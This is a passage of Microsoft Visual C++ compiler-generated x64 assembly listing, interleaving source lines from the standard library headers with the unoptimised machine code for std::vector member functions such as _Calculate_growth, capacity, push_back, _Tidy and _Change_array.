; 1894 :         _ASAN_VECTOR_CREATE;
; 1895 :     }

	add	rsp, 88					; 00000058H
	ret	0
?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Change_array
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
_Oldcapacity$ = 32
_Max$ = 40
_Geometric$ = 48
this$ = 80
_Newsize$ = 88
?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 1823 :     _CONSTEXPR20 size_type _Calculate_growth(const size_type _Newsize) const {

$LN5:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 1824 :         // given _Oldcapacity and _Newsize, calculate geometric growth
; 1825 :         const size_type _Oldcapacity = capacity();

	mov	rcx, QWORD PTR this$[rsp]
	call	?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::capacity
	mov	QWORD PTR _Oldcapacity$[rsp], rax

; 1826 :         const auto _Max              = max_size();

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size
	mov	QWORD PTR _Max$[rsp], rax

; 1827 : 
; 1828 :         if (_Oldcapacity > _Max - _Oldcapacity / 2) {

	xor	edx, edx
	mov	rax, QWORD PTR _Oldcapacity$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Max$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	cmp	QWORD PTR _Oldcapacity$[rsp], rax
	jbe	SHORT $LN2@Calculate_

; 1829 :             return _Max; // geometric growth would overflow

	mov	rax, QWORD PTR _Max$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN2@Calculate_:

; 1830 :         }
; 1831 : 
; 1832 :         const size_type _Geometric = _Oldcapacity + _Oldcapacity / 2;

	xor	edx, edx
	mov	rax, QWORD PTR _Oldcapacity$[rsp]
	mov	ecx, 2
	div	rcx
	mov	rcx, QWORD PTR _Oldcapacity$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR _Geometric$[rsp], rax

; 1833 : 
; 1834 :         if (_Geometric < _Newsize) {

	mov	rax, QWORD PTR _Newsize$[rsp]
	cmp	QWORD PTR _Geometric$[rsp], rax
	jae	SHORT $LN3@Calculate_

; 1835 :             return _Newsize; // geometric growth would be insufficient

	mov	rax, QWORD PTR _Newsize$[rsp]
	jmp	SHORT $LN1@Calculate_
$LN3@Calculate_:

; 1836 :         }
; 1837 : 
; 1838 :         return _Geometric; // geometric growth is sufficient

	mov	rax, QWORD PTR _Geometric$[rsp]
$LN1@Calculate_:

; 1839 :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Calculate_growth@?$vector@_WV?$allocator@_W@std@@@std@@AEBA_K_K@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
_My_data$ = 0
this$ = 32
?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::capacity, COMDAT

; 1739 :     _NODISCARD _CONSTEXPR20 size_type capacity() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1740 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1741 :         return static_cast<size_type>(_My_data._Myend - _My_data._Myfirst);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax+16]
	sub	rax, rcx
	sar	rax, 1

; 1742 :     }

	add	rsp, 24
	ret	0
?capacity@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::capacity
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
this$ = 64
?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size, COMDAT

; 1734 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1735 :         return (_STD min)(

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
	mov	rcx, rax
	call	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
	mov	QWORD PTR $T1[rsp], rax
	call	?max@?$numeric_limits@_J@std@@SA_JXZ	; std::numeric_limits<__int64>::max
	mov	QWORD PTR $T2[rsp], rax
	lea	rdx, QWORD PTR $T1[rsp]
	lea	rcx, QWORD PTR $T2[rsp]
	call	??$min@_K@std@@YAAEB_KAEB_K0@Z		; std::min<unsigned __int64>
	mov	rax, QWORD PTR [rax]

; 1736 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alty_traits::max_size(_Getal()));
; 1737 :     }

	add	rsp, 56					; 00000038H
	ret	0
?max_size@?$vector@_WV?$allocator@_W@std@@@std@@QEBA_KXZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ
_TEXT	SEGMENT
_My_data$ = 32
this$ = 64
__$ReturnUdt$ = 72
?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::end, COMDAT

; 1666 :     _NODISCARD _CONSTEXPR20 iterator end() noexcept {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1667 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1668 :         return iterator(_My_data._Mylast, _STD addressof(_My_data));

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	??$addressof@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_Vector_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_Vector_val<std::_Simple_types<wchar_t> > >
	mov	r8, rax
	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR [rax+8]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1669 :     }

	add	rsp, 56					; 00000038H
	ret	0
?end@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::end
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ
_TEXT	SEGMENT
_My_data$ = 32
this$ = 64
__$ReturnUdt$ = 72
?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::begin, COMDAT

; 1656 :     _NODISCARD _CONSTEXPR20 iterator begin() noexcept {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 1657 :         auto& _My_data = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1658 :         return iterator(_My_data._Myfirst, _STD addressof(_My_data));

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	??$addressof@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_Vector_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_Vector_val<std::_Simple_types<wchar_t> > >
	mov	r8, rax
	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR __$ReturnUdt$[rsp]
	call	??0?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@QEAA@PEA_WPEBU_Container_base0@1@@Z
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1659 :     }

	add	rsp, 56					; 00000038H
	ret	0
?begin@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?AV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@2@XZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::begin
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z
_TEXT	SEGMENT
this$ = 48
_Val$ = 56
?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::push_back, COMDAT

; 912  :     _CONSTEXPR20 void push_back(const _Ty& _Val) { // insert element at end, provide strong guarantee

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 913  :         emplace_back(_Val);

	mov	rdx, QWORD PTR _Val$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::emplace_back<wchar_t const &>

; 914  :     }

	add	rsp, 40					; 00000028H
	ret	0
?push_back@?$vector@_WV?$allocator@_W@std@@@std@@QEAAXAEB_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::push_back
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ PROC	; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >, COMDAT

; 806  :     _CONSTEXPR20 ~vector() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 807  :         _Tidy();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Tidy

; 808  : #if _ITERATOR_DEBUG_LEVEL != 0
; 809  :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Getal());
; 810  :         _Delete_plain_internal(_Alproxy, _STD exchange(_Mypair._Myval2._Myproxy, nullptr));
; 811  : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 812  :     }

	add	rsp, 40					; 00000028H
	ret	0
??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ENDP	; std::vector<wchar_t,std::allocator<wchar_t> >::~vector<wchar_t,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ PROC	; std::vector<wchar_t,std::allocator<wchar_t> >::vector<wchar_t,std::allocator<wchar_t> >, COMDAT

; 675  :     _CONSTEXPR20 vector() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1><>

; 676  :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 677  :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ ENDP	; std::vector<wchar_t,std::allocator<wchar_t> >::vector<wchar_t,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEBAAEBV?$allocator@E@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEBAAEBV?$allocator@E@2@XZ PROC ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first, COMDAT

; 1386 :     constexpr const _Ty1& _Get_first() const noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1387 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1388 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEBAAEBV?$allocator@E@2@XZ ENDP ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAAAEAV?$allocator@E@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAAAEAV?$allocator@E@2@XZ PROC ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first, COMDAT

; 1382 :     constexpr _Ty1& _Get_first() noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 1383 :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 1384 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAAAEAV?$allocator@E@2@XZ ENDP ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ??0?$_Vector_val@U?$_Simple_types@E@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_Vector_val@U?$_Simple_types@E@std@@@std@@QEAA@XZ PROC ; std::_Vector_val<std::_Simple_types<unsigned char> >::_Vector_val<std::_Simple_types<unsigned char> >, COMDAT

; 392  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+8], 0
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax+16], 0
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0?$_Vector_val@U?$_Simple_types@E@std@@@std@@QEAA@XZ ENDP ; std::_Vector_val<std::_Simple_types<unsigned char> >::_Vector_val<std::_Simple_types<unsigned char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal, COMDAT

; 2047 :     _NODISCARD _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2048 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEBAAEBV?$allocator@E@2@XZ ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first

; 2049 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEBAAEBV?$allocator@E@2@XZ ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ
_TEXT	SEGMENT
this$ = 48
?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal, COMDAT

; 2043 :     _NODISCARD _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2044 :         return _Mypair._Get_first();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	?_Get_first@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAAAEAV?$allocator@E@2@XZ ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Get_first

; 2045 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Orphan_range@?$vector@EV?$allocator@E@std@@@std@@AEBAXPEAE0@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
__formal$ = 24
?_Orphan_range@?$vector@EV?$allocator@E@std@@@std@@AEBAXPEAE0@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Orphan_range, COMDAT

; 2040 :     _CONSTEXPR20 void _Orphan_range(pointer, pointer) const {}

	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Orphan_range@?$vector@EV?$allocator@E@std@@@std@@AEBAXPEAE0@Z ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Orphan_range
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ
_TEXT	SEGMENT
?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Xlength, COMDAT

; 1999 :     [[noreturn]] static void _Xlength() {

$LN3:
	sub	rsp, 40					; 00000028H

; 2000 :         _Xlength_error("vector too long");

	lea	rcx, OFFSET FLAT:??_C@_0BA@FOIKENOD@vector?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
$LN2@Xlength:

; 2001 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Xlength@?$vector@EV?$allocator@E@std@@@std@@CAXXZ ENDP ; std::vector<unsigned char,std::allocator<unsigned char> >::_Xlength
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ
_TEXT	SEGMENT
_Myfirst$ = 32
_My_data$ = 40
_Al$ = 48
_Mylast$ = 56
_Myend$ = 64
this$ = 96
?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ PROC	; std::vector<unsigned char,std::allocator<unsigned char> >::_Tidy, COMDAT

; 1897 :     _CONSTEXPR20 void _Tidy() noexcept { // free all storage

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1898 :         auto& _Al         = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 1899 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1900 :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 1901 :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 1902 :         pointer& _Myend   = _My_data._Myend;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 16
	mov	QWORD PTR _Myend$[rsp], rax

; 1903 : 
; 1904 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 1905 : 
; 1906 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rax, QWORD PTR _Myfirst$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Tidy

; 1907 :             _Destroy_range(_Myfirst, _Mylast, _Al);

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z ; std::_Destroy_range<std::allocator<unsigned char> >

; 1908 :             _ASAN_VECTOR_REMOVE;
; 1909 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	rcx, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	rax, QWORD PTR [rax]
	sub	rax, rcx
	mov	r8, rax
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?deallocate@?$allocator@E@std@@QEAAXQEAE_K@Z ; std::allocator<unsigned char>::deallocate

; 1910 : 
; 1911 :             _Myfirst = nullptr;

	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	QWORD PTR [rax], 0

; 1912 :             _Mylast  = nullptr;

	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	QWORD PTR [rax], 0

; 1913 :             _Myend   = nullptr;

	mov	rax, QWORD PTR _Myend$[rsp]
	mov	QWORD PTR [rax], 0
$LN2@Tidy:

; 1914 :         }
; 1915 :     }

	add	rsp, 88					; 00000058H
	ret	0
?_Tidy@?$vector@EV?$allocator@E@std@@@std@@AEAAXXZ ENDP	; std::vector<unsigned char,std::allocator<unsigned char> >::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\vector
;	COMDAT ?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z
_TEXT	SEGMENT
_Myfirst$ = 32
_My_data$ = 40
_Al$ = 48
_Mylast$ = 56
_Myend$ = 64
this$ = 96
_Newvec$ = 104
_Newsize$ = 112
_Newcapacity$ = 120
?_Change_array@?$vector@EV?$allocator@E@std@@@std@@AEAAXQEAE_K1@Z PROC ; std::vector<unsigned char,std::allocator<unsigned char> >::_Change_array, COMDAT

; 1875 :     _CONSTEXPR20 void _Change_array(const pointer _Newvec, const size_type _Newsize, const size_type _Newcapacity) {

$LN4:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 88					; 00000058H

; 1876 :         // orphan all iterators, discard old array, acquire new array
; 1877 :         auto& _Al         = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAV?$allocator@E@2@XZ ; std::vector<unsigned char,std::allocator<unsigned char> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 1878 :         auto& _My_data    = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 1879 :         pointer& _Myfirst = _My_data._Myfirst;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR _Myfirst$[rsp], rax

; 1880 :         pointer& _Mylast  = _My_data._Mylast;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 8
	mov	QWORD PTR _Mylast$[rsp], rax

; 1881 :         pointer& _Myend   = _My_data._Myend;

	mov	rax, QWORD PTR _My_data$[rsp]
	add	rax, 16
	mov	QWORD PTR _Myend$[rsp], rax

; 1882 : 
; 1883 :         _My_data._Orphan_all();

	mov	rcx, QWORD PTR _My_data$[rsp]
	call	?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 1884 : 
; 1885 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rax, QWORD PTR _Myfirst$[rsp]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN2@Change_arr

; 1886 :             _Destroy_range(_Myfirst, _Mylast, _Al);

	mov	r8, QWORD PTR _Al$[rsp]
	mov	rax, QWORD PTR _Mylast$[rsp]
	mov	rdx, QWORD PTR [rax]
	mov	rax, QWORD PTR _Myfirst$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z ; std::_Destroy_range<std::allocator<unsigned char> >

; 1887 :             _ASAN_VECTOR_REMOVE;
